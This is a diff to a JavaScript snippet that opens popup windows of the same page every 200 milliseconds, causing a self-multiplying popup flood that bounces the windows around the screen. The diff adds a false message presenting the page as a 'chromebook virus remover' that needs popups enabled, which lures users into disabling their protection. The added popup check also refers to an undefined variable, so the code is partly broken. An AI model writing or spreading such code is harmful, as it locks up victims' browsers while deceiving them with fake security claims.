@@ -1,22 +1,25 @@
 function moveWindows() {
   // Create two windows
-  var window1 = window.open(location.href, '_blank', 'width=200,height=200');
-  var window2 = window.open(location.href, '_blank', 'width=200,height=200');
-  window1.close();
+  let window1 = window.open(location.href, "_blank", "width=200,height=200");
+  let window2 = window.open(location.href, "_blank", "width=200,height=200");
+
+  if (!newWin || newWin.closed || typeof newWin.closed == "undefined") {
+    document.querySelector('h1').innerHTML="The chromebook virus remover makes a popup that removes the virus. Please enable popups and reload this page."
+  }
 
   // Set the initial positions and velocities of the windows
-  var window1X = 0;
-  var window1Y = 0;
-  var window1VX = 5;
-  var window1VY = 5;
+  let window1X = Math.random() * window.innerWidth - 200;
+  let window1Y = Math.random() * window.innerHeight - 200;
+  let window1VX = 3;
+  let window1VY = 3;
 
-  var window2X = window.innerWidth - 200;
-  var window2Y = window.innerHeight - 200;
-  var window2VX = -5;
-  var window2VY = -5;
+  let window2X = Math.random() * window.innerWidth - 200;
+  let window2Y = Math.random() * window.innerHeight - 200;
+  let window2VX = 3;
+  let window2VY = 3;
 
   // Move the windows diagonally and make them bounce off the edges
-  const frame = function() {
+  const frame = function () {
     // Move window 1
     window1X += window1VX;
     window1Y += window1VY;
@@ -42,12 +45,12 @@ function moveWindows() {
     if (window2Y <= 0 || window2Y >= window.innerHeight - 200) {
       window2VY *= -1;
     }
-    requestAnimationFrame(frame)
-  }
-  frame()
+    requestAnimationFrame(frame);
+  };
+  frame();
 }
 
 // Call the function to start moving the windows
 setInterval(() => {
-	moveWindows();
-}, 200)
+  moveWindows();
+}, 200);
